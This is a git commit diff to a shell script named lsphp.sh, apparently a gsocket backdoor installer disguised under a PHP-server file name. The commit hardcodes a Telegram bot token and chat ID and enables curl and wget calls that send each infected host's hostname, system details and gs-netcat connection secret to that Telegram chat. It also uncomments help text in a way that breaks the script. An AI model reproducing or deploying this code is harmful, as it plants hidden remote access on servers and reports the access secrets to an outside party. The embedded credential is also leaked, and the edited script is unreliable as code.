0be1d993cfe09a1f325cd6f905a651bddd61376a
Vathan <tambengskibidi@gmail.com>
2026-06-02 19:38:36 +0700

    Update lsphp.sh

--- lsphp.sh
+++ lsphp.sh
@@ -46,10 +46,10 @@
 #       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
-# GS_TG_TOKEN=
-#       - Telegram Bot ID, =""
-# GS_TG_CHATID=
-#       - Telegram Chat ID, =""
+GS_TG_TOKEN=
+      - Telegram Bot ID, =8757338168:AAF5iZd15_7rL31vKmCRI-2Zl76TUwIQC6w
+GS_TG_CHATID=
+      - Telegram Chat ID, =-4670927725
 # GS_DISCORD_KEY=
 #       - Discord API key, =""
 # GS_WEBHOOK_KEY=
@@ -89,18 +89,18 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-GS_TG_TOKEN="8757338168:AAF5iZd15_7rL31vKmCRI-2Zl76TUwIQC6w"
-GS_TG_CHATID="-4670927725"
+GS_TG_TOKEN=8757338168:AAF5iZd15_7rL31vKmCRI-2Zl76TUwIQC6w
+GS_TG_CHATID=-4670927725
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
-	# GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 }
 ### Generic URL as webhook (any URL)
-[[ -n $GS_WEBHOOK ]] && {
-	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
-	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
-}
-### webhook.site
+# [[ -n $GS_WEBHOOK ]] && {
+# 	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+# 	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+# }
+# ### webhook.site
 # GS_WEBHOOK_KEY=""
 # [[ -n $GS_WEBHOOK_KEY ]] && {
 # 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
